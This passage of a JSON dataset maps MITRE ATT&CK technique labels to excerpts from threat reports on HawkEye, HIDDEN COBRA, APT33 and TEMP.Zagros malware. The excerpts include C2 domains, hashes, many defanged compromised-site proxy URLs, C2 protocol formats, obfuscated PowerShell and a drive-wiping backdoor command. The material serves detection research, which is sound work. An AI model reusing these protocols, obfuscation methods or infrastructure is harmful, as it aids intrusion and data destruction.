            "While the seller specifies that HawkEye Reborn should only be used on systems with permission, they also explicitly forbid scanning of HawkEye Reborn executables using antivirus software, likely an attempt to minimize the likelihood that anti-malware solutions will detect HawkEye Reborn binaries.Following these changes, the new developer of HawkEye Reborn has continued to make changes and we expect this to continue as long as the developer can monetize their efforts.As with other malware that we wrote about last year, while the developer claims that the software should only be used on systems with permission, or \"for educational purposes,\" malicious attackers have been continuously leveraging it against various targets around the world.Distribution campaignsFor several months during the last half of 2018 and continuing into 2019, Cisco Talos has observed ongoing malicious email campaigns that are being used to distribute versions of the HawkEye Reborn keylogger/stealer"
        ]
    },
    "system network configuration discovery hidden files and directories remote system discovery network service scanning windows admin shares-multi": {
        "technique_names": [
            "system network configuration discovery",
            "hidden files and directories",
            "remote system discovery",
            "network service scanning",
            "windows admin shares",
            "tor"
        ],
        "sentances": [
            "Additionally, the appendices of this report provide network signatures to aid in the detection and mitigation of HIDDEN COBRA activity.Network Signatures and Host-Based RulesThis section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors"
        ]
    },
    "security software discovery disabling security tools indicator removal on host powershell-multi": {
        "technique_names": [
            "security software discovery",
            "disabling security tools",
            "indicator removal on host",
            "powershell",
            "tor"
        ],
        "sentances": [
            "Failed login activity can be indicative of failed intrusion activity.If remote access between zones is an unavoidable business need, log and monitor these connections closely.In environments with a high risk of interception or intrusion, organizations should consider supplementing password authentication with other forms of authentication such as challenge/response or multifactor authentication using biometric or physical tokens.Logging PracticesSystem operators should follow these secure logging practices.Ensure event logging, including applications, events, login activities, and security attributes, is turned on or monitored for identification of security issues.Configure network logs to provide adequate information to assist in quickly developing an accurate determination of a security incident.Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related.Secure logs in a centralized location and protect them from modification.Prepare an incident response plan that can be rapidly administered in case of a cyber intrusion"
        ]
    },
    "clipboard data masquerading user execution exfiltration over alternative protocol data encoding data encrypted-multi": {
        "technique_names": [
            "clipboard data",
            "masquerading",
            "user execution",
            "exfiltration over alternative protocol",
            "data encoding",
            "data encrypted"
        ],
        "sentances": [
            "Based on packet capture analysis of previous implants from 2017, the following strings are used in control server communications:  Connection: keep-alive Cache-Control: max-age=0 Accept: */* Content-Type: multipart/form-data; boundary= Content-Type: application/octet-stream Accept-Encoding: gzip,deflate,sdch Accept-Language: ko-KR -> Korean  Content-Disposition: form-data;name=\u201dboard_id\u201d Content-Disposition: form-data;name=\u201duser_id\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dimg01_29.jpg\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dmy.doc\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dpratice.pdf\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dking.jpg\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201ddream.avi\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dhp01.avi\u201d Content-Disposition: form-data;name=\u201dfile1\u2033; filename=\u201dstar.avi\u201d  User Agents The implant either fetches the user agent from Internet Explorer (using ObtainUserAgentAsString()) or uses a default user agent specified in the malware binary: Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36 Control Server Communications The malware initiates communication with the control server by sending it an HTTP POST request with additional optional HTTP data, such as: ------FormBoundary<randomly_generated_characters> Content-Disposition: form-data; name=\"board_id\"  8306 ------FormBoundary<randomly_generated_characters> Content-Disposition: form-data; name=\"user_id\"  *dJU!*JE&!M@UNQ@ ------FormBoundary<randomly_generated_characters> Content-Disposition: form-data; name=\"file1\"; filename=\"king.jpg\" Content-Type: application/octet-stream  board_id is a four-digit number that may be an identifier for a campaign ID"
        ]
    },
    "timestomp data staged exfiltration over command and control channel-multi": {
        "technique_names": [
            "timestomp",
            "data staged",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "Create processes Write responses from the control server to a file Send information for all drives Write data sent by the control server to a temporary file matching the file path pattern %temp%\\DWS00* Change the time of a file as specified by the control server  The malware changing the file time"
        ]
    },
    "process injection process discovery system time discovery-multi": {
        "technique_names": [
            "process injection",
            "process discovery",
            "system time discovery"
        ],
        "sentances": [
            "Gather the process time for all processes  Getting time information for all processes running on the system"
        ]
    },
    "timestomp exfiltration over command and control channel-multi": {
        "technique_names": [
            "timestomp",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "Read a specified file\u2019s contents and send the data to the control server Write data sent by the control server to an existing file Mark a file to be deleted on reboot  Marking a file for deletion on reboot"
        ]
    },
    "pass the hash": [
        "A code comparison of hash 12c786c490366727cf7279fc141921d8 with hash 6de6a0df263ecd2d71a92597b2362f2c (from November 28, 2017).\u00a0 Conclusion We have found what may be an early data-gathering stage for future possible heists from financial organizations in Turkey (and possibly other countries)"
    ],
    "custom cryptographic protocol exploitation for privilege escalation-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "exploitation for privilege escalation"
        ],
        "sentances": [
            "Public    TURNEDUP  Backdoor capable of uploading and downloading files, creating a reverse shell, taking screenshots, and gathering system information  Non-Public   Indicators of Compromise APT33 Domains Likely Used in Initial Targeting    Domain    boeing.servehttp[.]com    alsalam.ddns[.]net    ngaaksa.ddns[.]net    ngaaksa.sytes[.]net    vinnellarabia.myftp[.]org   APT33 Domains / IPs Used for C2    C2 Domain  MALWARE    managehelpdesk[.]com  NANOCORE    microsoftupdated[.]com  NANOCORE    osupd[.]com  NANOCORE    mywinnetwork.ddns[.]net  NETWIRE    www.chromup[.]com  TURNEDUP    www.securityupdated[.]com  TURNEDUP    googlmail[.]net  TURNEDUP    microsoftupdated[.]net  TURNEDUP    syn.broadcaster[.]rocks  TURNEDUP    www.googlmail[.]net  TURNEDUP   Publicly Available Tools used by APT33    MD5  MALWARE  Compile Time (UTC)    3f5329cf2a829f8840ba6a903f17a1bf  NANOCORE  2017/1/11 2:20    10f58774cd52f71cd4438547c39b1aa7  NANOCORE  2016/3/9 23:48    663c18cfcedd90a3c91a09478f1e91bc  NETWIRE  2016/6/29 13:44    6f1d5c57b3b415edc3767b079999dd50  NETWIRE  2016/5/29 14:11   Unattributed DROPSHOT / SHAPESHIFT MD5 Hashes     MD5   MALWARE   Compile Time (UTC)    0ccc9ec82f1d44c243329014b82d3125  DROPSHOT (drops SHAPESHIFT  n/a - timestomped    fb21f3cea1aa051ba2a45e75d46b98b8  DROPSHOT  n/a - timestomped    3e8a4d654d5baa99f8913d8e2bd8a184  SHAPESHIFT  2016/11/14 21:16:40    6b41980aa6966dda6c3f68aeeb9ae2e0  SHAPESHIFT  2016/11/14 21:16:40   APT33 Malware MD5 Hashes    MD5  MALWARE  Compile Time (UTC)    8e67f4c98754a2373a49eaf53425d79a  DROPSHOT (drops TURNEDUP)  2016/10/19 14:26    c57c5529d91cffef3ec8dadf61c5ffb2  TURNEDUP  2014/6/1 11:01    c02689449a4ce73ec79a52595ab590f6  TURNEDUP  2016/9/18 10:50    59d0d27360c9534d55596891049eb3ef  TURNEDUP  2016/3/8 12:34    59d0d27360c9534d55596891049eb3ef  TURNEDUP  2016/3/8 12:34    797bc06d3e0f5891591b68885d99b4e1  TURNEDUP  2015/3/12 5:59    8e6d5ef3f6912a7c49f8eb6a71e18ee2  TURNEDUP  2015/3/12 5:59    32a9a9aa9a81be6186937b99e04ad4be  TURNEDUP  2015/3/12 5:59    a272326cb5f0b73eb9a42c9e629a0fd8  TURNEDUP  2015/3/9 16:56    a813dd6b81db331f10efaf1173f1da5d  TURNEDUP  2015/3/9 16:56    de9e3b4124292b4fba0c5284155fa317  TURNEDUP  2015/3/9 16:56    a272326cb5f0b73eb9a42c9e629a0fd8  TURNEDUP  2015/3/9 16:56    b3d73364995815d78f6d66101e718837  TURNEDUP  2014/6/1 11:01    de7a44518d67b13cda535474ffedf36b  TURNEDUP  2014/6/1 11:01    b5f69841bf4e0e96a99aa811b52d0e90  TURNEDUP  2014/6/1 11:01    a2af2e6bbb6551ddf09f0a7204b5952e  TURNEDUP  2014/6/1 11:01    b189b21aafd206625e6c4e4a42c8ba76  TURNEDUP  2014/6/1 11:01    aa63b16b6bf326dd3b4e82ffad4c1338  TURNEDUP  2014/6/1 11:01    c55b002ae9db4dbb2992f7ef0fbc86cb  TURNEDUP  2014/6/1 11:01    c2d472bdb8b98ed83cc8ded68a79c425  TURNEDUP  2014/6/1 11:01    c6f2f502ad268248d6c0087a2538cad0  TURNEDUP  2014/6/1 11:01    c66422d3a9ebe5f323d29a7be76bc57a  TURNEDUP  2014/6/1 11:01    ae47d53fe8ced620e9969cea58e87d9a  TURNEDUP  2014/6/1 11:01    b12faab84e2140dfa5852411c91a3474  TURNEDUP  2014/6/1 11:01    c2fbb3ac76b0839e0a744ad8bdddba0e  TURNEDUP  2014/6/1 11:01    a80c7ce33769ada7b4d56733d02afbe5  TURNEDUP  2014/6/1 11:01    6a0f07e322d3b7bc88e2468f9e4b861b  TURNEDUP  2014/6/1 11:01    b681aa600be5e3ca550d4ff4c884dc3d  TURNEDUP  2014/6/1 11:01    ae870c46f3b8f44e576ffa1528c3ea37  TURNEDUP  2014/6/1 11:01    bbdd6bb2e8827e64cd1a440e05c0d537  TURNEDUP  2014/6/1 11:01    0753857710dcf96b950e07df9cdf7911  TURNEDUP  2013/4/10 10:43    d01781f1246fd1b64e09170bd6600fe1  TURNEDUP  2013/4/10 10:43    1381148d543c0de493b13ba8ca17c14f  TURNEDUP  2013/4/10 10:43"
        ]
    },
    "standard application layer protocol remote file copy-multi": {
        "technique_names": [
            "standard application layer protocol",
            "remote file copy"
        ],
        "sentances": [
            "Previously the fake website linked to the following documents in a third fake Oxford domain, oxford[.]in: http://oxford[.]in/downloads/ls1.doc http://oxford[.]in/downloads/ls2.doc http://oxford[.]in/downloads/ls3.doc http://oxford[.]in/downloads/ls4.do The documents were unavailable during our research, and their content is unknown to us",
            "The Trojan will respond to the C2 to notify it of a successful upload by sending a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(\u201cFile Uploaded\u201d)> The download command (3) reads the contents of a specified file and sends the data to the C2 server"
        ]
    },
    "system network configuration discovery web service-multi": {
        "technique_names": [
            "system network configuration discovery",
            "web service"
        ],
        "sentances": [
            "Backdoor.Remexi, one of the malware in use by Chafer, had the following \u00a0command and control\u00a0host: 87pqxz159.dockerjsbin[.]com Interestingly, IP address \u00a083.142.230.138, which\u00a0serve as a\u00a0command and control address for an OilRig related sample (3a5fcba80c1fd685c4b5085d9d474118), was pointed to by\u00a087pqxz159.dockerjsbin[.]com as well"
        ]
    },
    "spearphishing attachment user execution-multi": {
        "technique_names": [
            "spearphishing attachment",
            "user execution",
            "arp"
        ],
        "sentances": [
            "One such email that we were able to obtain was targeting users in Turkey, as shown in Figure 4:    Figure 4: Sample spear phishing email containing macro-based document attachment The malicious Microsoft Office attachments that we observed appear to have been specially crafted for individuals in four countries: Turkey, Pakistan, Tajikistan and India"
        ]
    },
    "deobfuscate/decode files or information scripting-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "scripting"
        ],
        "sentances": [
            "Indirect Code Execution Through INF and SCT This scriptlet code execution technique leveraging INF and SCT files was recently discovered and documented in February 2018"
        ]
    },
    "custom cryptographic protocol obfuscated files or information-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "obfuscated files or information"
        ],
        "sentances": [
            "Some of the instances used in this script are: $eNv:puBLic[13]+$ENv:pUBLIc[5]+'x' ($ENV:cOMsPEC[4,26,25]-jOin'')      XOR encoding: The biggest section of the PowerShell script is XOR encoded using a single byte key, as shown in Figure 11",
            "If there are keys for the string encryption with the XOR algorithm, the configuration data will be also encrypted with the XOR algorithm",
            "Strings in the backdoor are encrypted using a custom algorithm that uses XOR with a 4-byte key"
        ]
    },
    "custom cryptographic protocol connection proxy-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "connection proxy"
        ],
        "sentances": [
            "Figure 12: DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 server Section 2 The second section of the PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server"
        ]
    },
    "execution through api deobfuscate/decode files or information command-line interface-multi": {
        "technique_names": [
            "execution through api",
            "deobfuscate/decode files or information",
            "command-line interface"
        ],
        "sentances": [
            "Several techniques are employed for executing the PowerShell code: If command starts with \u201cexcel\u201d, then it leverages DDEInitiate Method of Excel.Appilcation to execute the code:\u00a0 If the command starts with\u00a0\u201coutlook\u201d, then it leverages Outlook.Application and MSHTA to execute the code:\u00a0 If the command starts with \u201crisk\u201d, then execution is performed through DCOM object:\u00a0     File upload functionality"
        ]
    },
    "screen capture system information discovery scheduled task execution through api deobfuscate/decode files or information-multi": {
        "technique_names": [
            "screen capture",
            "system information discovery",
            "scheduled task",
            "execution through api",
            "deobfuscate/decode files or information"
        ],
        "sentances": [
            "C2 Command   Purpose    reboot  Reboot the system using shutdown command    shutdown  Shut down the system using shutdown command    clean  Wipe the Drives, C:\\, D:\\, E:\\, F:\\    screenshot  Take a screenshot of the System    upload  Encrypt and upload the information from the system    excel  Leverage Excel.Application COM object for code execution    outlook  Leverage Outlook.Application COM object for code execution    risk  Leverage DCOM object for code execution   Conclusion This activity shows us that TEMP.Zagros stays up-to-date with the latest code execution and persistence mechanism techniques, and that they can quickly leverage these techniques to update their malware"
        ]
    },
    "spearphishing link system service discovery binary padding account discovery file and directory discovery exploitation for client execution fallback channels windows admin shares-multi": {
        "technique_names": [
            "spearphishing link",
            "system service discovery",
            "binary padding",
            "account discovery",
            "file and directory discovery",
            "exploitation for client execution",
            "fallback channels",
            "windows admin shares",
            "arp",
            "tor"
        ],
        "sentances": [
            ".doc  Turkey    009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0  idrbt.doc  \u00a0  India    18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6  T\u00fcrkiye Cumhuriyeti Kimlik Kart\u0131.doc  Turkey    3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb  Turkish Armed Forces.doc  \u00a0  Turkey    9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c  na.gov.pk.doc  \u00a0  Pakistan    3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115  MVD-FORM-1800.doc  Tajikistan    cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88  KEGM-CyberAttack.doc  Turkey    1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942  IL-1801.doc  Turkey    aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627  kiyiemniyeti.doc  Turkey    93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84  TCELL-S1-M.doc  Tajikistan    c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9  egm-1.doc  Turkey    2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13  Connectel .pk.doc  Pakistan    18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd  g\u00c3\u0178venlik_y\u00c3\u0153nergesi_.doc  Turkey    153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58  MIT.doc  Turkey    d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025  Gvenlik Ynergesi.doc  Turkey    af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102  Gvenlik Ynergesi.doc  Turkey    5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af  NA  Turkey    3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c  Anadolu G\u00c3\u00bcneydo\u00c4\u0178u Projesinde .doc  Turkey   Network Indicators List of Proxy URLs hxxp://alessandrofoglino[.]com//db_template.php hxxp://www.easy-home-sales[.]co.za//db_template.php hxxp://www.almaarefut[.]com/admin/db_template.php hxxp://chinamall[.]co.za//db_template.php hxxp://amesoulcoaching[.]com//db_template.php hxxp://www.antigonisworld[.]com/wp-includes/db_template.php hxxps://anbinni.ba/wp-admin/db_template.php hxxp://arctistrade[.]de/wp/db_template.php hxxp://aianalytics[.]ie//db_template.php hxxp://www.gilforsenate[.]com//db_template.php hxxp://mgamule[.]co.za/oldweb/db_template.php hxxp://chrisdejager-attorneys[.]co.za//db_template.php hxxp://alfredocifuentes[.]com//db_template.php hxxp://alxcorp[.]com//db_template.php hxxps://www.aircafe24[.]com//db_template.php hxxp://agencereferencement.be/wp-admin/db_template.php hxxp://americanlegacies[.]org/webthed_ftw/db_template.php hxxps://aloefly[.]net//db_template.php hxxp://www.duotonedigital[.]co.za//db_template.php hxxp://architectsinc[.]net//db_template.php hxxp://www.tanati[.]co.za//db_template.php hxxp://emware[.]co.za//db_template.php hxxp://breastfeedingbra[.]co.za//db_template.php hxxp://alhidayahfoundation[.]co[.]uk/category/db_template.php hxxp://cashforyousa[.]co.za//db_template.php hxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.php hxxp://antjetaubert[.]de//db_template.php hxxp://hesterwebber[.]co.za//db_template.php hxxp://fickstarelectrical[.]co.za//db_template.php hxxp://alex-frost[.]com/assets/db_template.php hxxps://americanbrasil[.]com.br//db_template.php hxxps://aileeshop[.]com//db_template.php hxxps://annodle[.]com//db_template.php hxxp://goldeninstitute[.]co.za/contents/db_template.php hxxp://ednpk[.]com//db_template.php hxxp://www.arabiccasinochoice[.]com//db_template.php hxxp://proeventsports[.]co.za//db_template.php hxxp://glenbridge[.]co.za//db_template.php hxxp://berped[.]co.za//db_template.php hxxp://best-digital-slr-cameras[.]com//db_template.php hxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.php hxxp://www.alpacal[.]com//db_template.php hxxps://www.alakml[.]com/wp-admin/db_template.php hxxp://ar-rihla[.]com//db_template.php hxxp://appsvoice[.]info//db_template.php hxxp://www.bashancorp[.]co.za//db_template.php hxxp://alexanderbecker[.]net/services/db_template.php hxxp://visionclinic.co.ls/visionclinic/db_template.php hxxps://www.angelesrevista[.]com//db_template.php hxxps://www.antojoentucocina[.]com//db_template.php hxxp://apollonweb[.]com//db_template.php hxxps://www.alphapixa[.]com//db_template.php hxxp://capitalradiopetition[.]co.za//db_template.php hxxp://www.generictoners[.]co.za//db_template.php hxxps://alnahdatraining[.]com//db_template.php hxxps://albousala[.]com//db_template.php hxxps://www.dopetroleum[.]com//db_template.php hxxp://bios-chip[.]co.za//db_template.php hxxp://www.crissamconsulting[.]co.za//db_template.php hxxp://capriflower[.]co.za//db_template.php hxxp://www.dingaanassociates[.]co.za//db_template.php hxxp://indiba-africa[.]co.za//db_template.php hxxp://verifiedseller[.]co.za/js/db_template.php hxxps://www.buraqlubricant[.]com//db_template.php hxxp://aqarco[.]com/wp-admin/db_template.php hxxp://allaboutblockchain[.]net//db_template.php hxxp://www.amexcars[.]info/tpl/db_template.php hxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.php hxxp://bakron[.]co.za//db_template.php hxxp://gsnconsulting[.]co.za//db_template.php hxxp://vumavaluations[.]co.za//db_template.php hxxp://heritagetravelmw[.]com//db_template.php hxxp://ampvita[.]com//db_template.php hxxp://ahero-resource-center[.]org/administrator/db_template.php hxxps://arbulario[.]com//db_template.php hxxp://havilahglo[.]co.za/wpscripts/db_template.php hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.php hxxp://delectronics[.]com[.]pk//db_template.php hxxp://antucomp[.]com//db_template.php hxxp://advocatetn[.]com/font-awesome/fonts/db_template.php hxxps://amooy[.]com/webservice/db_template.php hxxp://www.harmonyguesthouse[.]co.za//db_template.php hxxp://alanrori[.]com//db_template.php hxxp://algarvesup[.]com//db_template.php hxxp://desirablehair[.]co.za//db_template.php hxxp://comsip[.]org.mw//db_template.php hxxp://jdcorporate[.]co.za/catalog/db_template.php hxxp://andrewfinnburhoe[.]com//db_template.php hxxp://anyeva[.]com/wp-includes/db_template.php hxxp://www.agenceuhd[.]com//db_template.php hxxp://host4unix[.]net/host24new/db_template.php hxxp://www.altaica[.]ca/wordpress/db_template.php hxxp://www.allbuyer[.]co[.]uk//db_template.php hxxp://jvpsfunerals[.]co.za//db_template.php hxxp://immaculatepainters[.]co.za//db_template.php hxxp://tcpbereka[.]co.za/js/db_template.php hxxp://clientcare.co.ls//db_template.php hxxp://investaholdings[.]co.za/htc/db_template.php hxxp://www.amjobs[.]co[.]uk//db_template.php hxxp://www.agirlgonewine[.]com/store/db_template.php hxxp://findinfo-more[.]com//db_template.php hxxp://asgen[.]org//db_template.php hxxp://alphasalesrecruitment[.]com//db_template.php hxxp://irshadfoundation[.]co.za//db_template.php hxxp://analternatif[.]com/includes/db_template.php hxxp://arbruisseau[.]com/profiles/db_template.php hxxp://ladiescircle[.]co.za//db_template.php hxxp://all-reseller[.]com/zzz_backup/db_template.php hxxp://alcatrazmoon[.]com/images/db_template.php hxxp://www.alcalumni[.]com/wp-includes/db_template.php hxxp://aniljoseph[.]com/servermon/db_template.php hxxp://alwake3press[.]com/wp-includes/db_template.php hxxp://www.hfhl[.]org.ls/habitat/db_template.php hxxp://alcafricanos[.]com/slsmonographs/db_template.php hxxps://agapeencounter[.]org//db_template.php hxxp://apobiomedix[.]ca//db_template.php hxxp://anythinglah[.]info//db_template.php hxxp://aniroleplay[.]net//db_template.php hxxp://www.allcopytoners[.]com//db_template.php hxxp://alphaobring[.]com//db_template.php hxxp://www.galwayprimary[.]co.za//db_template.php hxxp://alnuzha[.]org/en/db_template.php hxxps://ancient-wisdoms[.]com//db_template.php hxxp://amazingenergysavings[.]net//db_template.php hxxp://gvs[.]com[.]pk/font-awesome/db_template.php hxxp://geetransfers[.]co.za/font-awesome/db_template.php hxxp://carlagrobler[.]co.za/components/db_template.php hxxp://amazingashwini[.]com//db_template.php hxxp://aminearserver[.]es//db_template.php hxxp://lensofafrica[.]co.za//db_template.php hxxp://greenacrestf[.]co.za/video/db_template.php hxxp://www.tonaro[.]co.za//db_template.php hxxp://alephit2[.]biz/kitzz/db_template.php hxxp://lppaportal[.]org.ls//db_template.php hxxp://alkousy[.]com//db_template.php hxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.php hxxp://fragranceoil[.]co.za//db_template.php hxxp://www.eloquent[.]co.za/nweb2/db_template.php hxxp://chrishanicdc[.]org/wpimages/db_template.php hxxp://ahc.me[.]uk//db_template.php hxxp://www.britishasia-equip[.]co[.]uk//db_template.php hxxp://always-beauty[.]ch//db_template.php hxxps://www.ancamamara[.]com/wp-admin/db_template.php hxxp://entracorntrading[.]co.za//db_template.php hxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.php hxxp://americabr[.]com.br//db_template.php hxxp://andrew-snyder[.]net/bootstrap/db_template.php hxxp://signsoftime[.]co.za//db_template.php hxxp://aperta-armis[.]org//db_template.php hxxp://absfinancialplanning[.]co.za/images/db_template.php hxxp://charispaarl[.]co.za//db_template.php hxxp://indlovusecurity[.]co.za//db_template.php hxxp://alcafricandatalab[.]com//db_template.php hxxp://amor-clubhotels[.]com//db_template.php hxxp://mokorotlocorporate[.]com//db_template.php hxxp://apppriori[.]com//db_template.php hxxp://luxconprojects[.]co.za//db_template.php hxxp://androidphonetips[.]com/wp-includes/db_template.php hxxp://angel-seeds[.]com.ua/catalog/db_template.php hxxp://alissanicolai[.]com/assets/db_template.php hxxps://www.amateurastronomy[.]org//db_template.php hxxp://aiofotoevideo[.]com//db_template.php hxxp://www.amika.hr//db_template.php hxxp://comfortex[.]co.za/php/db_template.php hxxp://deepgraphics[.]co.za//db_template.php hxxps://agiledepot[.]com//db_template.php hxxp://almatours[.]gr//db_template.php hxxp://analystcnwang[.]com//db_template.php hxxp://www.malboer[.]co.za/trendy1/db_template.php hxxp://sefikengfarm.co.ls//db_template.php hxxp://www.antirughenaturale[.]com/wp-admin/db_template.php hxxp://passright[.]co.za//db_template.php hxxp://seismicfactory[.]co.za//db_template.php hxxp://alessandroalessandrini[.]it//db_template.php hxxps://aquabsafe[.]com//db_template.php hxxp://amatikulutours[.]com/tmp/db_template.php hxxp://ganitis[.]gr//db_template.php hxxp://aleenasgiftbox[.]com/admin/db_template.php hxxps://allusdoctors[.]com/themes/db_template.php hxxp://alainsaffel[.]com//db_template.php hxxp://www.ariehandomri[.]com//db_template.php hxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.php hxxp://itengineering[.]co.za/gatewaydiamond/db_template.php hxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.php hxxp://www.albertamechanical[.]ca//db_template.php hxxp://alchamel[.]info//db_template.php hxxps://almokan[.]net/wp-includes/db_template.php hxxp://jakobieducation[.]co.za//db_template.php hxxps://arc-sec[.]net//db_template.php hxxp://ldams[.]org.ls/supplies/db_template.php hxxp://menaboracks[.]co.za/tmp/db_template.php hxxp://www.getcord[.]co.za//db_template.php hxxp://boardaffairs[.]com//db_template.php hxxp://capetownway[.]co.za//db_template.php hxxp://cloudhostdesign[.]com//db_template.php hxxp://hartenboswaterpark[.]co.za/templates/db_template.php hxxp://fccorp[.]co.za/php/db_template.php hxxp://angar68[.]com//db_template.php hxxp://www.dws-gov[.]co.za//db_template.php hxxp://alwahahweb[.]com//db_template.php hxxp://anuragcreatives[.]com//db_template.php hxxp://embali[.]co.za//db_template.php hxxp://albertaedmonton[.]com/widgetstyles/db_template.php hxxp://altosdefontana[.]com//db_template.php hxxp://airfanhydro[.]net//db_template.php hxxps://www.alexponcet[.]com/wp-includes/db_template.php hxxp://agropecuariavilarica[.]com.br//db_template.php hxxps://www.amazingbuyrd[.]com/admin/db_template.php hxxp://cdxtrading[.]co.za//db_template.php hxxp://interafricaconsulting[.]com/wpimages/db_template.php hxxp://glgroup[.]co.za/images/db_template.php hxxp://hisandherskennels[.]co.za/php/db_template.php hxxp://alemaohost[.]com/lotosorg[.]com/db_template.php hxxp://isibaniedu[.]co.za/admin/db_template.php hxxp://dianakleyn[.]co.za/layouts/db_template.php hxxp://themotoringcalendar[.]co.za//db_template.php hxxp://www.loansonhomes[.]co.za//db_template.php hxxp://edgesecurity[.]co.za/js/db_template.php hxxp://highschoolsuperstar[.]co.za/files/db_template.php hxxp://www.ambientproperty[.]com//db_template.php hxxp://animationshowreel[.]co.il//db_template.php hxxp://cafawelding[.]co.za/font-awesome/db_template.php hxxp://apalawyers.pt//db_template.php hxxp://www.edesignz[.]co.za//db_template.php hxxp://centuryacademy[.]co.za/css/db_template.php hxxps://ambyenta.hr//db_template.php hxxp://ceramica[.]co.za//db_template.php hxxp://www.alfredoposada[.]com//db_template.php hxxp://anastasovsworkshop[.]com/wp-includes/db_template.php hxxp://allisonplumbing[.]com/wp-includes/db_template.php hxxp://eastrandmotorlab[.]co.za/fleet/db_template.php hxxp://angelsongroup[.]com/wp-includes/db_template.php hxxp://www.mikimaths[.]com//db_template.php hxxp://hjb-racing[.]co.za/htdocs/db_template.php hxxp://anotherpartofme[.]com/wp-includes/db_template.php hxxp://www.andreabelfi[.]com//db_template.php hxxp://www.iancullen[.]co.za//db_template.php hxxp://alaskamaterials[.]com//db_template.php hxxp://jeanetteproperties[.]co.za//db_template.php hxxp://www.digitalmedia[.]co.za//db_template.php hxxp://www.rejoicetheatre[.]com//db_template.php hxxps://alterwebhost[.]com//db_template.php hxxp://bc-u[.]co[.]uk//db_template.php hxxp://dpscdgkhan.edu[.]pk/shopping/db_template.php hxxp://edgeforensic[.]co.za//db_template.php hxxp://willpowerpos[.]co.za//db_template.php hxxp://antrismode[.]com/wp-includes/db_template.php hxxp://colenesphotography[.]co.za/modules/db_template.php hxxp://anthaigroup.vn//db_template.php hxxps://alphainvestors[.]com.au//db_template.php hxxps://aliart[.]nl//db_template.php hxxps://allmantravel[.]com/thumbs/db_template.php hxxp://fbrvolume[.]co.za//db_template.php hxxp://amordegato[.]es/storefront/db_template.php hxxp://agylub[.]com//db_template.php hxxp://www.khotsonglodge.co.ls//db_template.php hxxp://ampli5yd[.]com//db_template.php hxxps://animeok[.]co.il//db_template.php hxxps://arbeidsrechtcentrum[.]nl//db_template.php hxxp://erniecommunications[.]co.za/js/db_template.php hxxp://promechtransport[.]co.za/scripts/db_template.php hxxp://centuriongsd[.]co.za//db_template.php hxxp://www.agencesylvieleclerc[.]com//db_template.php hxxp://delcom[.]co.za//db_template.php hxxps://aleoestudio[.]com/gallonature/db_template.php hxxp://oftheearthphotography[.]com/www/db_template.php hxxp://h-dubepromotions[.]co.za//db_template.php hxxp://www.alessioborzuola[.]com/downloads/db_template.php hxxp://crystaltidings[.]co.za//db_template.php hxxp://funeralbusinesssolution[.]com/email_template/db_template.php hxxp://funisalodge[.]co.za/data1/db_template.php hxxp://experttutors[.]co.za//db_template.php hxxps://www[.]cartridgecave[.]co.za//db_template.php hxxp://ecs-consult[.]com//db_template.php hxxp://www.animationinisrael[.]org/tmp_images/db_template.php hxxp://gideonitesprojects[.]com//db_template.php hxxp://hybridauto[.]co.za/photography/db_template.php hxxp://africanpixels.zar.cc//db_template.php hxxp://ryanchristiefurniture[.]co.za//db_template.php hxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.php hxxp://almeriahotelja[.]com/dk/db_template.php hxxp://al3abflash[.]biz//db_template.php hxxp://www.fun4kidz[.]co.za//db_template.php hxxp://alsharhanstore[.]com//db_template.php hxxp://www[.]infratechconsulting[.]com//db_template.php hxxp://algihad[.]com/assets/db_template.php hxxp://americanwestmedia[.]com//db_template.php hxxp://charliewestsecurity[.]co.za//db_template.php hxxp://beehiveholdingszar[.]co.za//db_template.php 